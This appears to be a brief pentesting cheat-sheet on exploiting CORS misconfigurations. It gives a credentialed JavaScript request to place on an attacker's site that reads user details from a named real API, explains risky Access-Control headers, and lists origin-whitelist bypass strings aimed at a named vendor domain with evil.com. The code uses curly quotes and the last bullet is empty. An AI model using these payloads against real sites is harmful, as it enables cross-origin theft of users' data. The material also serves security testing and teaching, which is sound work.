## Introduction 

CORS short of Cross-Origin Resource Sharing is a policy that allows a site to share relevant information to other domains. Misconfiguration might leads to leakage of data to attackers.

## Payloads example

Place following code in the site you control:

```js
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById(“demo”).innerHTML =
alert(this.responseText);
}
};
xhttp.open(“GET”, “https://api.artsy.net/api/user_details/<User-ID>”, true);
xhttp.withCredentials = true;
xhttp.send();
}
```

## Some misconfiguration example

- If you find that ```Access-Control-Allow-Origin: *``` is shown in response, it means that the site allows all domains to access information under this domain;

- Sometimes, if ```Access-Control-Allow-Credentials:true```, it means all response can be shown to request within ```Access-Control-Allow-Origin```. Information includes cookies etc. Thus, in this case, even ```Access-Control-Allow-Origin``` set to company's subdomain, if XSS was founded in other subdomain, it also can lead to data leakage; 

- Sometimes, even if ```Access-Control-Allow-Origin``` was set, placing origin with some domain containing white list domain wordings can also bypass the subject check. (e.g. whitelist: request.com, bypass: attackrequest.com or request.com.attack.com). Some other examples of bypass:

```
*.ubnt.com!.evil.com 
*.ubnt.com".evil.com 
*.ubnt.com$.evil.com 
*.ubnt.com%0b.evil.com 
*.ubnt.com%60.evil.com 
*.ubnt.com&.evil.com 
*.ubnt.com'.evil.com 
*.ubnt.com(.evil.com 
*.ubnt.com).evil.com 
*.ubnt.com*.evil.com 
*.ubnt.com,.evil.com 
*.ubnt.com;.evil.com 
*.ubnt.com=.evil.com 
*.ubnt.com^.evil.com 
*.ubnt.com`.evil.com 
*.ubnt.com{.evil.com 
*.ubnt.com|.evil.com 
*.ubnt.com}.evil.com 
*.ubnt.com~.evil.com
```

- 

